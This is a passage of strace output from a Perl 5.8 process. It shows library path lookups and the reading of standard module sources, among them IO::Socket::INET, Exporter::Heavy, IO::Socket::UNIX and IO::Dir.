undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
11347 07:37:14.612424 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612441 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612454 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612468 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612482 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612495 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612509 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612522 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612535 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612548 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612561 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612574 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612588 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.612602 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
11347 07:37:14.612623 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.612638 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.612650 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.612667 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
11347 07:37:14.613356 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
11347 07:37:14.613564 brk(0x829c000)    = 0x829c000
11347 07:37:14.613872 read(8, "", 4096) = 0
11347 07:37:14.613889 close(8)          = 0
11347 07:37:14.615005 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
11347 07:37:14.620854 _llseek(6, 6496, [6496], SEEK_SET) = 0
11347 07:37:14.620871 _llseek(6, 0, [6496], SEEK_CUR) = 0
11347 07:37:14.620882 close(6)          = 0
11347 07:37:14.620944 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620960 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620960 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620961 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620961 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620961 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620961 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620968 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620982 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.620995 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.621008 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.621022 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
11347 07:37:14.621044 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.621059 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.621071 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.621087 brk(0x82bd000)    = 0x82bd000
11347 07:37:14.621106 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
11347 07:37:14.622020 _llseek(6, 1386, [1386], SEEK_SET) = 0
11347 07:37:14.622042 _llseek(6, 0, [1386], SEEK_CUR) = 0
11347 07:37:14.622053 close(6)          = 0
11347 07:37:14.622109 stat64("/etc/perl/IO/Dir.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622125 stat64("/etc/perl/IO/Dir.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622138 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622151 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622165 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622178 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622192 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622203 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622216 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622228 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622241 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.622254 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
11347 07:37:14.622285 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.622300 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.622312 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.622332 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
11347 07:37:14.622850 stat64("/etc/perl/Tie/Hash.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622869 stat64("/etc/perl/Tie/Hash.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622883 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622895 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622909 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622922 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622937 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622948 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622961 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622973 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622986 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.622999 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.623012 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.623026 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
11347 07:37:14.623047 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.623062 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.623073 _llseek(8, 0, [0], SEEK_CUR) = 0
